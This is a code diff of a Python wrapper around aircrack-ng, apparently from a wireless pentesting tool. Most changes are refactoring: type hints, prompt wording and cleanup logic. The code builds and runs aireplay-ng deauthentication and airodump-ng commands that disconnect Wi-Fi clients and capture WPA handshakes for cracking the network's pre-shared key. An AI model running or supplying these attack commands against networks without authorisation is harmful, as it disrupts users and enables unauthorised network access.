@@ -2,7 +2,7 @@
 import csv
 from pathlib import Path as FPath
 from secrets import token_hex
-from typing import Any
+from typing import Any, Dict, List, Optional, Union
 
 from prettytable import PrettyTable
 
@@ -26,7 +26,7 @@ class aircrack(install_packages.PackageInstaller, wireless_cards.card_manager,
         self.InputManager = tk_elements.InputManager
         self.stop_nmgr = stop_nmgr
 
-    def scan_aps(self) -> None:
+    def scan_aps(self) -> Optional[Union[bool, int]]:
         self.clear()
         if self.stop_nmgr:
             self.nm_stop()
@@ -60,6 +60,7 @@ class aircrack(install_packages.PackageInstaller, wireless_cards.card_manager,
 
         try:
             self.run(cmd)
+            return True
         except(KeyboardInterrupt, EOFError):
             return True
 
@@ -68,7 +69,7 @@ class aircrack(install_packages.PackageInstaller, wireless_cards.card_manager,
         ap_table = PrettyTable()
         ap_table.field_names = list(self.red.return_colour("No.", "BSSID", "Channel", "Privacy",
                                                            "Cipher", "Auth", "PWR", "ESSID"))
-        ap_map = {}
+        ap_map: Dict[str, List[str]] = {}
         num_map = {}
         ap_counter = 1
         n_counter = -1
@@ -86,8 +87,8 @@ class aircrack(install_packages.PackageInstaller, wireless_cards.card_manager,
                     ap_counter += 1
 
                 elif 0 < len(i) < 9:
-                    y_dot = self.yellow.return_colour("*")
-                    this_ap = ap_map.get(i[-2].strip())
+                    y_dot: str = self.yellow.return_colour("*")
+                    this_ap: Optional[List[str]] = ap_map.get(i[-2].strip())
 
                     if this_ap is not None and y_dot not in this_ap[0]:
                         ap_map[this_ap[1]][0] = this_ap[0].strip() + y_dot
@@ -111,10 +112,9 @@ class aircrack(install_packages.PackageInstaller, wireless_cards.card_manager,
 
     def deauth_capture(self) -> None:
         self.clear()
-        opt_table = PrettyTable()
         chosen = 0
         options = [
-            "Send Deauth to broadcast addr & capture handshake",
+            "Send Deauth to broadcast address & capture handshake",
             "Send Deauth to specific client & capture handshake",
             "Don't send Deauths, listen passively for handshake"
         ]
@@ -123,12 +123,11 @@ class aircrack(install_packages.PackageInstaller, wireless_cards.card_manager,
                                                               "Cipher", "Auth", "PWR", "ESSID"))
         ap_table.add_row(self.target_ap)
         print(ap_table, end="\n\n")
-        opt_table.field_names = [self.green.return_colour("No."), self.yellow.return_colour("Action")]
-        for i in enumerate(options, start=1):
-            opt_table.add_row(i)
 
-        print(opt_table, end="\n\n")
-        self.blue.print_status("i", "Please enter integer relating to desired action.\n")
+        for i in enumerate(options, start=1):
+            print(f"  [{self.deep_green.return_colour(i[0])}] - {i[1]}")
+        print("\n")
+        self.blue.print_status("i", "Please enter integer relating to required action.\n")
         chosen = self.InputManager("modules/aircrack/deauth_selection").get(i[0])
         print()
 
@@ -137,7 +136,7 @@ class aircrack(install_packages.PackageInstaller, wireless_cards.card_manager,
             return False
 
         self.green.print_success("Target AP selected, let's capture a handshake for PSK retrieval.")
-        self.cap_path = constants.CAP_FILES / token_hex()
+        self.cap_path: FPath = constants.CAP_FILES / token_hex()
 
         if chosen == 1:
             self.yellow.print_status("!", "You've chosen to deauth broadcast, this will disconnect all clients\n")
@@ -148,19 +147,17 @@ class aircrack(install_packages.PackageInstaller, wireless_cards.card_manager,
             cmd: str = (f"{constants.AIREPLAY_PATH} -0 {deauth_count} -a {self.target_ap[1]} {self.card_name} && "
                         f"{constants.AIRODUMP_PATH} --output-format pcap -w {self.cap_path} -c {self.target_ap[2]} "
                         f"--bssid {self.target_ap[1]} --ignore-negative-one {self.card_name} "
-                        " | tee /dev/tty > >(grep -i -m 1 ']\[ WPA handshake:' -q && sleep 2 &&"  # noqa: W605
+                        " | tee /dev/tty > >(grep -i -m 1 ']\[ WPA handshake:' -q && sleep 1 &&"  # noqa: W605
                         " pkill airodump-ng)")
             self.yellow.print_status(
-                "i", "When you're ready, press enter, if a deauth isn't captured, press Ctrl-C & try again.\n"
+                "i", "When you're ready, press enter, if a deauth isn't captured, press Ctrl-C & try again."
             )
             self.InputManager("modules/aircrack/confirm_capture").get(passthrough=True)
 
         elif chosen == 2:
             ext = ", the AP might not have clients" if self.yellow.return_colour("*") not in self.target_ap[0] else ""
-            self.yellow.print_status("!", f"You've chosen to deauth a specific client{ext}.\n")
-            self.green.print_success(
-                "When you're ready, hit enter to enumerate clients, press Ctrl-C to stop when desired"
-            )
+            self.yellow.print_status("!", f"You've chosen to deauth a specific client{ext}")
+            self.green.print_success("When you're ready, hit Enter. Press Ctrl-C when target client is seen\n")
             self.InputManager("modules/aircrack/enum_client").get(passthrough=True)
             client_list = constants.TEMP_FILES / token_hex()
             try:
@@ -187,6 +184,11 @@ class aircrack(install_packages.PackageInstaller, wireless_cards.card_manager,
             self.clear()
             print(clients, end="\n\n")
             client_list.unlink()
+
+            if len(client_map) == 0:
+                self.red.print_fail("No clients found connected to AP, please try again")
+                return
+
             self.blue.print_status("i", "Please enter number of desired client to deauth\n")
             client_mac: Any = client_map.get(
                 self.InputManager("modules/aircrack/choose_client").get(clients_counter), ""
@@ -206,7 +208,7 @@ class aircrack(install_packages.PackageInstaller, wireless_cards.card_manager,
                 f"{constants.AIREPLAY_PATH} -0 {deauth_count} -a {self.target_ap[1]} -c {client_mac} {self.card_name}"
                 f" && {constants.AIRODUMP_PATH} --output-format pcap -w {self.cap_path} -c {self.target_ap[2]} "
                 f"--bssid {self.target_ap[1]} --ignore-negative-one {self.card_name} "
-                " | tee /dev/tty > >(grep -i -m 1 ']\[ WPA handshake:' -q && sleep 2 &&"  # noqa: W605
+                " | tee /dev/tty > >(grep -i -m 1 ']\[ WPA handshake:' -q && sleep 1 &&"  # noqa: W605
                 " pkill airodump-ng)"
             )
 
@@ -219,15 +221,16 @@ class aircrack(install_packages.PackageInstaller, wireless_cards.card_manager,
             cmd = (
                 f"{constants.AIRODUMP_PATH} --output-format pcap -w {self.cap_path} -c {self.target_ap[2]} "
                 f"--bssid {self.target_ap[1]} --ignore-negative-one {self.card_name} "
-                " | tee /dev/tty > >(grep -i -m 1 ']\[ WPA handshake:' -q && sleep 2 &&"  # noqa: W605
+                " | tee /dev/tty > >(grep -i -m 1 ']\[ WPA handshake:' -q && sleep 1 &&"  # noqa: W605
                 " pkill airodump-ng)"
             )
 
-        self.cap_path = str(self.cap_path) + "-01.cap"
+        self.cap_file: str = str(self.cap_path) + "-01.cap"
 
         try:
             self.run(f"iwconfig {self.card_name} channel {self.target_ap[2]}")
             self.run(f'/usr/bin/env bash -c "{cmd}"')
+            self.green.print_success("Successfully captured 4-way handshake")
 
         except(KeyboardInterrupt, EOFError):
             self.reset_term()
@@ -236,9 +239,10 @@ class aircrack(install_packages.PackageInstaller, wireless_cards.card_manager,
         ...
 
     def cleanup(self) -> None:
-        self.set_mode(0)
+        self.set_mode(0) if self.card_name not in [None, ""] else ...
         if self.stop_nmgr:
             self.nm_start()
+        self.reset_cards()
         self.green.print_success(f"Cleaned up {self.card_name}")
 
 
